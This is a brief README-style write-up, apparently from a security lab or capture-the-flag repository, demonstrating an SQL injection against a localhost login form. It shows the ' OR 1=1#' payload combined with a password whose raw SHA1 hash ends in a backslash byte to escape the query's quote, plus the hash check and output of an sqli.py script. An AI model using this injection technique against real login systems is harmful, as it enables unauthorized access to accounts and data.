DO NOT USE THIS STUFFS! IT'S VULNERABLE TO EBOLA!!!!

```
$ http --form POST http://localhost:8080/ login=' OR 1=1#' pass='/var/games/gnibbles.1.1.scores' | cat
<pre>SELECT login FROM users WHERE passwd='��4
�N븘H��\' AND login=' or 1=1#'</pre>          H��
<h2></h2>
<form action="" method="POST">
    <input type="text" name="login">
    <input type="password" name="pass">
    <input type="submit">
</form>
```

```
$ echo -n '/var/games/gnibbles.1.1.scores' | sha1sum 
90cc3400040b48a79a0dfc4eebb8984817eceb5c  -
```

``5c`` is the ``ASCII`` value for ``\``, the escape character in the ``SQL``.

Using the script ``sqly.py``

```
$ python sqli.py
 ...
value: 71492D099F3B19FF08AC600C1D8F770D82D938A6
```